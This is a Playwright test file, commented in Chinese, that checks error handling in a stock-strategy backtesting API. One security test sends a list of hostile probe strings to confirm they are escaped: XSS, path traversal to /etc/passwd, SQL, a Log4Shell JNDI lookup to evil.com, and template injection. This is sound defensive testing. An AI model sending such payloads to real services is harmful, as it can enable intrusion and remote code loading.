import { test, expect } from '@playwright/test';
import { APIUtils } from '../../../tests/e2e/test-helpers';

test.describe('API错误响应测试', () => {
  let apiUtils: APIUtils;

  test.beforeAll(async () => {
    apiUtils = new APIUtils('http://localhost:8000');
  });

  test.describe('HTTP状态码错误', () => {
    test('应该处理400 Bad Request', async () => {
      // 发送无效请求数据
      const invalidRequest = {
        symbol: 'INVALID.FORMAT',
        shortWindow: -5,
        longWindow: 'invalid',
        initialCapital: 'not_a_number'
      };

      const response = await apiUtils.makeAPIRequest('/strategies/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(invalidRequest)
      });

      expect(response.status).toBe(400);

      const data = await response.json();
      expect(data.success).toBe(false);
      expect(data.message).toBeDefined();
      expect(typeof data.message).toBe('string');

      console.log(`✅ 400错误处理正确: ${data.message}`);
    });

    test('应该处理401 Unauthorized', async () => {
      // 如果API需要认证，测试未认证请求
      const response = await apiUtils.makeAPIRequest('/protected/endpoint');

      // 根据API设计，可能返回401或404
      if (response.status === 401) {
        const data = await response.json();
        expect(data.success).toBe(false);
        expect(data.message).toContain('认证');
        console.log(`✅ 401错误处理正确: ${data.message}`);
      } else {
        console.log(`ℹ️ API可能不需要认证，状态码: ${response.status}`);
      }
    });

    test('应该处理403 Forbidden', async () => {
      // 测试禁止访问的资源
      const response = await apiUtils.makeAPIRequest('/admin/strategies');

      if (response.status === 403) {
        const data = await response.json();
        expect(data.success).toBe(false);
        expect(data.message).toContain('权限');
        console.log(`✅ 403错误处理正确: ${data.message}`);
      } else {
        console.log(`ℹ️ 端点可能不存在或无需权限，状态码: ${response.status}`);
      }
    });

    test('应该处理404 Not Found', async () => {
      const notFoundEndpoints = [
        '/market-data/symbol/NONEXISTENT.SZ',
        '/strategies/config/invalid_config_id',
        '/strategies/results/invalid_result_id',
        '/nonexistent/endpoint'
      ];

      for (const endpoint of notFoundEndpoints) {
        const response = await apiUtils.makeAPIRequest(endpoint);

        // 大部分应该返回404
        if (response.status === 404) {
          const data = await response.json();
          expect(data.success).toBe(false);
          expect(data.message).toBeDefined();
          console.log(`✅ ${endpoint} 404错误处理正确: ${data.message}`);
        } else {
          console.log(`ℹ️ ${endpoint} 状态码: ${response.status}`);
        }
      }
    });

    test('应该处理405 Method Not Allowed', async () => {
      // 对GET端点使用POST方法
      const response = await apiUtils.makeAPIRequest('/market-data/symbols', {
        method: 'POST',
        body: JSON.stringify({})
      });

      if (response.status === 405) {
        const data = await response.json();
        expect(data.success).toBe(false);
        expect(data.message).toContain('方法');
        console.log(`✅ 405错误处理正确: ${data.message}`);
      } else {
        console.log(`ℹ️ 方法检查状态码: ${response.status}`);
      }
    });

    test('应该处理429 Too Many Requests', async () => {
      // 快速连续请求测试频率限制
      const rapidRequests = 20;
      let rateLimitHit = false;

      for (let i = 0; i < rapidRequests; i++) {
        const response = await apiUtils.makeAPIRequest('/market-data/symbols');

        if (response.status === 429) {
          rateLimitHit = true;
          const data = await response.json();
          expect(data.success).toBe(false);
          expect(data.message).toContain('频率');
          console.log(`✅ 429错误处理正确: ${data.message}`);
          break;
        }

        // 极短间隔
        await new Promise(resolve => setTimeout(resolve, 50));
      }

      if (!rateLimitHit) {
        console.log('ℹ️ 未触发频率限制，可能需要更高的请求频率');
      }
    });

    test('应该处理500 Internal Server Error', async () => {
      // 尝试触发服务器错误
      const errorTriggerRequests = [
        { endpoint: '/strategies/run', data: { symbol: null } },
        { endpoint: '/market-data/symbol', data: 'invalid_path' },
        { endpoint: '/debug/crash', data: {} }
      ];

      for (const request of errorTriggerRequests) {
        try {
          let response;
          if (request.endpoint === '/strategies/run') {
            response = await apiUtils.makeAPIRequest(request.endpoint, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(request.data)
            });
          } else {
            response = await apiUtils.makeAPIRequest(request.endpoint + '/' + request.data);
          }

          if (response.status === 500) {
            const data = await response.json();
            expect(data.success).toBe(false);
            expect(data.message).toBeDefined();
            console.log(`✅ 500错误处理正确: ${data.message}`);
            break;
          }
        } catch (error) {
          // 网络错误也算是一种错误处理
          console.log(`ℹ️ 请求${request.endpoint}导致网络错误: ${error.message}`);
        }
      }
    });
  });

  test.describe('错误响应格式验证', () => {
    test('所有错误响应都应该遵循统一格式', async () => {
      const errorScenarios = [
        { endpoint: '/market-data/symbol/INVALID.SZ', expectedStatus: 404 },
        { endpoint: '/strategies/config/invalid_id', expectedStatus: 404 },
        { endpoint: '/nonexistent/endpoint', expectedStatus: 404 }
      ];

      for (const scenario of errorScenarios) {
        const response = await apiUtils.makeAPIRequest(scenario.endpoint);

        if (response.status === scenario.expectedStatus) {
          const data = await response.json();

          // 验证统一错误响应格式
          expect(data).toHaveProperty('success');
          expect(data).toHaveProperty('data');
          expect(data).toHaveProperty('message');

          // 验证错误响应的必需字段
          expect(data.success).toBe(false);
          expect(data.data).toBe(null);
          expect(typeof data.message).toBe('string');
          expect(data.message.length).toBeGreaterThan(0);

          console.log(`✅ ${scenario.endpoint} 错误格式验证通过`);
        }
      }
    });

    test('错误信息应该包含有用的调试信息', async () => {
      const errorScenarios = [
        {
          request: () => apiUtils.makeAPIRequest('/market-data/symbol/INVALID.SZ'),
          expectedKeywords: ['股票', '代码', '不存在']
        },
        {
          request: () => apiUtils.makeAPIRequest('/strategies/run', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ symbol: null })
          }),
          expectedKeywords: ['参数', '验证', '错误']
        }
      ];

      for (const scenario of errorScenarios) {
        try {
          const response = await scenario.request();
          const data = await response.json();

          if (!data.success) {
            const message = data.message.toLowerCase();
            const hasUsefulInfo = scenario.expectedKeywords.some(keyword =>
              message.includes(keyword.toLowerCase())
            );

            expect(hasUsefulInfo).toBe(true);
            console.log(`✅ 错误信息有用性验证通过: ${data.message}`);
          }
        } catch (error) {
          console.log(`ℹ️ 错误场景验证失败: ${error.message}`);
        }
      }
    });
  });

  test.describe('错误恢复机制', () => {
    test('应该提供重试建议', async () => {
      const retryableErrors = [
        { endpoint: '/market-data/symbols', delayMs: 100 },
        { endpoint: '/market-data/symbol/000001.SZ', delayMs: 50 }
      ];

      for (const errorTest of retryableErrors) {
        try {
          // 第一次请求
          const response1 = await apiUtils.makeAPIRequest(errorTest.endpoint);
          const data1 = await response1.json();

          if (response1.ok) {
            // 等待一段时间后重试
            await new Promise(resolve => setTimeout(resolve, errorTest.delayMs));

            const response2 = await apiUtils.makeAPIRequest(errorTest.endpoint);
            const data2 = await response2.json();

            // 验证重试后仍然成功
            expect(response2.ok).toBe(true);
            expect(data2.success).toBe(true);

            console.log(`✅ ${errorTest.endpoint} 重试机制正常`);
          }
        } catch (error) {
          console.log(`ℹ️ ${errorTest.endpoint} 重试测试失败: ${error.message}`);
        }
      }
    });

    test('应该处理部分服务降级', async () => {
      // 测试部分功能不可用的情况
      const services = [
        { name: '市场数据', endpoint: '/market-data/symbols' },
        { name: '策略运行', endpoint: '/strategies/run' },
        { name: '结果查询', endpoint: '/strategies/results' }
      ];

      const availableServices = [];
      const unavailableServices = [];

      for (const service of services) {
        try {
          let response;
          if (service.endpoint === '/strategies/run') {
            response = await apiUtils.makeAPIRequest(service.endpoint, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                symbol: '000001.SZ',
                shortWindow: 5,
                longWindow: 20,
                initialCapital: 100000
              })
            });
          } else {
            response = await apiUtils.makeAPIRequest(service.endpoint);
          }

          if (response.ok) {
            availableServices.push(service.name);
          } else {
            unavailableServices.push(service.name);
          }
        } catch (error) {
          unavailableServices.push(service.name);
        }
      }

      console.log(`✅ 可用服务: ${availableServices.join(', ')}`);

      if (unavailableServices.length > 0) {
        console.log(`⚠️ 不可用服务: ${unavailableServices.join(', ')}`);

        // 至少应该有一些服务可用
        expect(availableServices.length).toBeGreaterThan(0);
      }
    });
  });

  test.describe('错误日志和监控', () => {
    test('错误响应应该包含请求ID', async () => {
      const response = await apiUtils.makeAPIRequest('/market-data/symbol/INVALID.SZ');
      const data = await response.json();

      if (!data.success) {
        // 检查是否有请求ID或类似的追踪信息
        const hasRequestId = data.requestId || data.traceId || data.correlationId;

        if (hasRequestId) {
          console.log(`✅ 错误响应包含追踪ID: ${hasRequestId}`);
        } else {
          console.log('ℹ️ 错误响应未包含追踪ID（建议添加）');
        }
      }
    });

    test('错误响应应该包含时间戳', async () => {
      const response = await apiUtils.makeAPIRequest('/market-data/symbol/INVALID.SZ');
      const data = await response.json();

      if (!data.success) {
        const hasTimestamp = data.timestamp || data.errorTime || data.time;

        if (hasTimestamp) {
          console.log(`✅ 错误响应包含时间戳: ${hasTimestamp}`);
        } else {
          console.log('ℹ️ 错误响应未包含时间戳（建议添加）');
        }
      }
    });

    test('应该记录错误统计信息', async () => {
      const errorTypes = new Map();

      const errorEndpoints = [
        '/market-data/symbol/INVALID.SZ',
        '/strategies/config/invalid_id',
        '/nonexistent/endpoint'
      ];

      for (const endpoint of errorEndpoints) {
        const response = await apiUtils.makeAPIRequest(endpoint);

        if (!response.ok) {
          const errorType = response.status.toString();
          errorTypes.set(errorType, (errorTypes.get(errorType) || 0) + 1);
        }
      }

      console.log('📊 错误统计:');
      for (const [type, count] of errorTypes) {
        console.log(`  ${type}错误: ${count}次`);
      }

      // 至少应该有一些错误被记录
      expect(errorTypes.size).toBeGreaterThan(0);
    });
  });

  test.describe('安全性相关错误', () => {
    test('应该隐藏敏感系统信息', async () => {
      const response = await apiUtils.makeAPIRequest('/debug/system-info');
      const data = await response.json();

      if (!data.success) {
        const message = data.message.toLowerCase();

        // 检查是否暴露了敏感信息
        const sensitiveKeywords = [
          'stack trace', 'file path', 'directory', 'password',
          'secret', 'key', 'token', 'internal', 'database'
        ];

        const hasSensitiveInfo = sensitiveKeywords.some(keyword =>
          message.includes(keyword)
        );

        expect(hasSensitiveInfo).toBe(false);
        console.log('✅ 错误响应未暴露敏感信息');
      }
    });

    test('应该防止错误信息注入', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '../../etc/passwd',
        'SELECT * FROM users',
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}'
      ];

      for (const maliciousInput of maliciousInputs) {
        try {
          const response = await apiUtils.makeAPIRequest(`/market-data/symbol/${encodeURIComponent(maliciousInput)}`);
          const data = await response.json();

          if (!data.success) {
            // 检查错误信息是否被转义或清理
            const message = data.message;
            const containsInput = message.includes(maliciousInput);

            // 输入应该被转义或不在错误信息中直接显示
            if (containsInput) {
              console.log(`⚠️ 输入可能未正确转义: ${maliciousInput}`);
            } else {
              console.log(`✅ 恶意输入处理安全: ${maliciousInput}`);
            }
          }
        } catch (error) {
          console.log(`ℹ️ 恶意输入测试异常: ${maliciousInput} - ${error.message}`);
        }
      }
    });
  });

  test.describe('性能相关错误', () => {
    test('应该处理请求超时', async () => {
      // 测试长耗时请求的超时处理
      const longRunningRequest = {
        symbol: '000001.SZ',
        shortWindow: 100,
        longWindow: 200,
        initialCapital: 100000
      };

      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000); // 5秒超时

      try {
        const response = await apiUtils.makeAPIRequest('/strategies/run', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(longRunningRequest),
          signal: controller.signal
        });

        clearTimeout(timeoutId);

        if (response.ok) {
          console.log('✅ 长耗时请求在超时前完成');
        }
      } catch (error) {
        if (error.name === 'AbortError') {
          console.log('✅ 请求超时处理正确');
        } else {
          console.log(`ℹ️ 其他错误: ${error.message}`);
        }
      }
    });

    test('应该处理内存不足情况', async () => {
      // 这个测试比较难模拟，但可以检查相关错误处理
      const memoryIntensiveRequest = {
        symbol: '000001.SZ',
        shortWindow: 5,
        longWindow: 20,
        initialCapital: Number.MAX_SAFE_INTEGER
      };

      const response = await apiUtils.makeAPIRequest('/strategies/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(memoryIntensiveRequest)
      });

      const data = await response.json();

      if (!data.success) {
        const message = data.message.toLowerCase();
        const isMemoryError = message.includes('memory') || message.includes('内存');

        if (isMemoryError) {
          console.log('✅ 内存错误处理正确');
        }
      }
    });
  });
});